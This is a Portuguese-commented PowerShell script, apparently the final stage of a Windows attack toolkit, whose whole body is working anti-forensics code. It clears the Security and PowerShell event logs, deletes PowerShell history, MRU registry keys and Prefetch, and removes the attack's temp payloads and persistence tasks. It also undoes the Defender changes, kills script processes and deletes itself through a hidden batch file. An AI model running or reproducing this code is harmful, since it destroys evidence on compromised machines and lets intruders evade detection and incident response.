# END.ps1 - Anti-Forensics e Autodestruição
# Este script deve ser o ÚLTIMO a ser executado.

# --- SINALIZA PARA OS OUTROS PROCESSOS (ex: distração) QUE DEVEM PARAR ---
$flagFile = "$env:TEMP\END_ALL.txt"
New-Item -Path $flagFile -ItemType File -Force | Out-Null

# Pequena pausa para que outros processos detectem o sinal
Start-Sleep -Seconds 1

# --- 1. LIMPEZA DE LOGS DO WINDOWS (EVENT VIEWER) ---
Write-Host "Limpando logs de eventos..."
$logs = @('Application', 'Security', 'System', 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational')
foreach ($log in $logs) {
    try {
        wevtutil cl $log 2>$null
    } catch {}
}

# --- 2. LIMPEZA DO HISTÓRICO DO POWERSHELL ---
Write-Host "Limpando histórico do PowerShell..."
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }

# Limpa também o histórico do PowerShell no registro (RunMRU)
$paths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"
)
foreach ($p in $paths) {
    if (Test-Path $p) {
        Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# --- 3. LIMPEZA DE ARQUIVOS TEMPORÁRIOS BAIXADOS ---
Write-Host "Removendo arquivos temporários do ataque..."
$tempFiles = @(
    "$env:TEMP\*.ps1",
    "$env:TEMP\*.vbs",
    "$env:TEMP\*.bat",
    "$env:TEMP\*.txt",
    "$env:TEMP\*UAC*",
    "$env:TEMP\*distraction*",
    "$env:TEMP\*defender*",
    "$env:TEMP\*profiler*",
    "$env:TEMP\*END*"
)
foreach ($pattern in $tempFiles) {
    Remove-Item -Path $pattern -Force -ErrorAction SilentlyContinue
}

# --- 4. RESTAURAÇÃO DO WINDOWS DEFENDER (SE DESATIVADO) ---
Write-Host "Restaurando configurações do Defender..."
try {
    # Reativa proteções
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableNetworkProtection $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableTamperProtection $false -ErrorAction SilentlyContinue
    # Remove exclusão do C:\ (se existir)
    Remove-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
} catch {}

# --- 5. LIMPEZA DE CACHE DNS E PREFETCH ---
Write-Host "Limpando cache DNS e Prefetch..."
ipconfig /flushdns | Out-Null
# Limpa o prefetch (pasta Windows\Prefetch, apenas arquivos .pf)
$prefetchPath = "$env:windir\Prefetch"
if (Test-Path $prefetchPath) {
    Get-ChildItem $prefetchPath -Filter "*.pf" | Remove-Item -Force -ErrorAction SilentlyContinue
}

# --- 6. REMOÇÃO DE TAREFAS AGENDADAS (se criadas) ---
Write-Host "Removendo tarefas agendadas suspeitas..."
$taskNames = @('Updater', 'SecurityScan', 'SystemMaintenance', 'DefenderUpdate') # Nomes comuns que podemos ter usado
foreach ($task in $taskNames) {
    try {
        schtasks /delete /tn $task /f 2>$null
    } catch {}
}

# --- 7. FECHAMENTO DE PROCESSOS REMANESCENTES (opcional) ---
# Exemplo: se a distração ainda estiver rodando, podemos forçar o fechamento
$processNames = @('powershell', 'wscript', 'cscript') # Se houver scripts em execução
foreach ($proc in $processNames) {
    Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

# --- 8. LIMPEZA DO ARQUIVO DE SINALIZAÇÃO (já não é mais necessário) ---
Remove-Item $flagFile -Force -ErrorAction SilentlyContinue

# --- 9. AUTOEXCLUSÃO DO SCRIPT (opcional, mas clean) ---
# O script atual não pode se deletar enquanto está em execução, mas podemos agendar uma exclusão
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    # Cria um arquivo .bat que deleta o script após alguns segundos
    $batContent = "@echo off`nping 127.0.0.1 -n 3 > nul`ndel `"$scriptPath`"`ndel %~f0"
    $batPath = "$env:TEMP\delete_script.bat"
    $batContent | Out-File -FilePath $batPath -Encoding ASCII
    Start-Process -FilePath $batPath -WindowStyle Hidden
}

Write-Host "Limpeza concluída. O sistema está limpo."